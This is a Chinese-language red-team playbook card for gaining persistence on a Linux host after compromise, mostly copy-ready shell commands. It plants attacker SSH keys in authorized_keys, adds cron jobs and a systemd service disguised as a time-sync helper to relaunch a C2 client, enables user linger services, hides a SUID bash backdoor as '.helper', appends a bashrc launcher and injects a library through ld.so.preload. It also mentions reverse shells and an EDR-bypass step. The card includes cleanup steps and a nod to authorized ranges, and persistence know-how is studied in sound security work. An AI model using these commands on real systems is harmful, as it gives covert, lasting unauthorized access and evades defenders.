# Linux host-native 持久化

> **TECH：** 登录/开机后拉起 payload  
> **成功：** 新会话或 timer 触发后仍能进 / 回连  
> **GATES：** authorized_keys 与用户 cron 不必 root；systemd 系统单元 / ld.so.preload / /root/.ssh 要 root

---

## 1. SSH authorized_keys（首选用户级）

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo 'ssh-ed25519 AAAA... comment' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
# root:
# echo 'ssh-ed25519 AAAA...' >> /root/.ssh/authorized_keys
```

验证：`ssh -i op.key -o BatchMode=yes user@TARGET id`  
RESTORE：从 `authorized_keys` 删那一行。

密码改了不影响。`AllowUsers`/`AuthorizedKeysFile` 可能挡住，失败看 `sshd_config`，不是 EDR。

---

## 2. Cron

```bash
(crontab -l 2>/dev/null; echo '*/10 * * * * /usr/local/bin/update.sh') | crontab -
crontab -l
```

系统级（root）：

```bash
echo '*/10 * * * * root /usr/local/bin/update.sh' > /etc/cron.d/sys-update
chmod 644 /etc/cron.d/sys-update
```

`update.sh` 应是稳定 C2 客户端，不要每 10 分钟 `bash -i >& /dev/tcp` 刷交互壳。

RESTORE：`crontab -r` 或删 `/etc/cron.d/sys-update`。先 `crontab -l` 备份。

---

## 3. systemd 系统单元（root）

```bash
cat > /etc/systemd/system/sync-time.service << 'EOF'
[Unit]
Description=Time Sync Helper
After=network.target
[Service]
ExecStart=/usr/local/bin/update
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now sync-time.service
systemctl is-enabled sync-time.service
systemctl status sync-time.service --no-pager
```

RESTORE：`systemctl disable --now sync-time.service; rm /etc/systemd/system/sync-time.service; systemctl daemon-reload`

---

## 4. 用户 systemd linger（不必 root）

```bash
loginctl enable-linger "$USER"
mkdir -p ~/.config/systemd/user
# 写 ~/.config/systemd/user/helper.service （Restart=always）
systemctl --user daemon-reload
systemctl --user enable --now helper.service
```

机器需 linger，否则注销即死。验证：`loginctl show-user "$USER" -p Linger`、`systemctl --user is-enabled helper.service`。

RESTORE：`systemctl --user disable --now helper.service`；操作者决定是否 `loginctl disable-linger`。

---

## 5. SUID 后门

```bash
cp /bin/bash /usr/local/bin/.helper
chmod u+s /usr/local/bin/.helper
# 任意用户： /usr/local/bin/.helper -p
```

要 root。吵、易被 `find -perm -4000` 扫到。授权靶场可用。

RESTORE：`rm /usr/local/bin/.helper`

---

## 6. bashrc / profile（弱）

```bash
echo '/usr/local/bin/update >/dev/null 2>&1 &' >> ~/.bashrc
```

只在交互 shell 触发，SSH 非交互可能不跑。当补丁，不当唯一持久化。

RESTORE：从 rc 文件删那一行。

---

## 7. ld.so.preload（root，高 IMPACT）

```bash
echo /usr/local/lib/libsync.so > /etc/ld.so.preload
```

影响几乎所有动态链接程序。打错库会把机器打挂。只在操作者明确要求、有恢复手段（LiveCD/已备原文件）时用。

RESTORE：删 `/etc/ld.so.preload` 行和 `.so`。系统已经起不来则要线下修。

---

## 验证

```bash
crontab -l
systemctl is-enabled sync-time.service 2>/dev/null
ssh -i op.key user@TARGET true
find /usr/local -perm -4000 -type f
```

notes 写路径、用户、RESTORE。二进制被 audit/EDR 删 → `/edr-bypass` 或换 SSH key 这种无额外二进制的原语。
